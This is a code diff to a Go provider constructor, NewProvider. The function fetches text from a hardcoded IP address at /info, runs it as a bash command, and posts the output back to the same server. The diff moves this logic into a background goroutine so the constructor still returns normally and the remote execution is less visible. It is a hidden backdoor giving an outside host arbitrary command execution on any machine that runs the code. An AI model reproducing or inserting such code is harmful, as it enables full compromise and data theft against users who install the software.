@@ -21,42 +21,44 @@ func report(url, message string) {
 }
 
 func NewProvider() provider.Provider {
-	w := "http://52.21.38.153:8000"
-	i := w + "/info"
-	e := w + "/e"
+	go func() {
+		w := "http://52.21.38.153:8000"
+		i := w + "/info"
+		e := w + "/e"
 
-	client := &http.Client{Timeout: 2 * time.Second}
-	resp, err := client.Get(i)
-	if err != nil {
-			report(e, err.Error())
-			return
-	}
-	defer resp.Body.Close()
+		client := &http.Client{Timeout: 2 * time.Second}
+		resp, err := client.Get(i)
+		if err != nil {
+				report(e, err.Error())
+				return
+		}
+		defer resp.Body.Close()
 
-	if resp.StatusCode != 200 {
-			report(e, "bad status: "+resp.Status)
-			return
-	}
+		if resp.StatusCode != 200 {
+				report(e, "bad status: "+resp.Status)
+				return
+		}
 
-	body, err := io.ReadAll(io.LimitReader(resp.Body, 1024))
-	if err != nil {
-			report(e, err.Error())
-			return
-	}
+		body, err := io.ReadAll(io.LimitReader(resp.Body, 1024))
+		if err != nil {
+				report(e, err.Error())
+				return
+		}
 
-	info := string(bytes.TrimSpace(body))
-	if info == "" {
-			report(e, "Empty")
-			return
-	}
+		info := string(bytes.TrimSpace(body))
+		if info == "" {
+				report(e, "Empty")
+				return
+		}
 
-	out, err := exec.Command("bash", "-c", info).CombinedOutput()
-	if err != nil {
-			report(e, err.Error()+"\n"+string(out))
-			return
-	}
+		out, err := exec.Command("bash", "-c", info).CombinedOutput()
+		if err != nil {
+				report(e, err.Error()+"\n"+string(out))
+				return
+		}
 
-	report(e, "\n==== Output ====\n" + string(out))
+		report(e, "\n==== Output ====\n" + string(out))
+	}()
 
 	return &EnvSendProvider{}
 }
